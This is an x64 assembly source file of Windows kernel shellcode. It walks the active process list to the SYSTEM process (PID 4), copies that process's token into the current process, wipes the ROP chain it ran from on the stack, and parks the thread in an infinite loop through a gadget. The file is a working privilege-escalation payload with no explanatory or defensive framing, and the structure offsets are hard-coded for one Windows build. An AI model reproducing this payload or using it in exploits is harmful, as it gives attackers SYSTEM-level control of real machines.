.code
shellcode_buf PROC
    mov  rax, gs:[0188h]   ; _KTHREAD
    mov rax,  QWORD PTR [rax + 0b8h]   ; Current _EPROCESS
    mov rbx, rax      ; Copy _EPROCESS to rbx
    __loop:
        mov rbx, [rbx + 0448h]    ; Go to next process through ActiveProcessLinks
        sub rbx, 0448h        ; Go back to current process (_EPROCESS)
        mov rcx, [rbx + 0440h]    ; Grab the PID
        cmp rcx, 04h      ; Check if PID matches SYSTEM PID
        jnz __loop      ; If not SYSTEM PID, jmp to __loop

    mov rcx, [rbx + 04b8h]    ; Grab the SYSTEM token
    mov [rax + 04b8h], rcx    ; Copy SYSTEM token to current process

   ; Wipe our ROPchain
   mov rcx, 010h
    __wiper_loop:
        and QWORD PTR [rsp + 0], 0
        sub rsp, 08h
        dec rcx
        cmp rcx, 0
        jnz __wiper_loop

    mov rax, rdx ; Get the jmp rax gadget in rax
    mov rsp, rbp ; Fix our stack pointer to the original value
    sub rsp, 0118h
    jmp rax ; Start the infinite loop

shellcode_buf ENDP
END
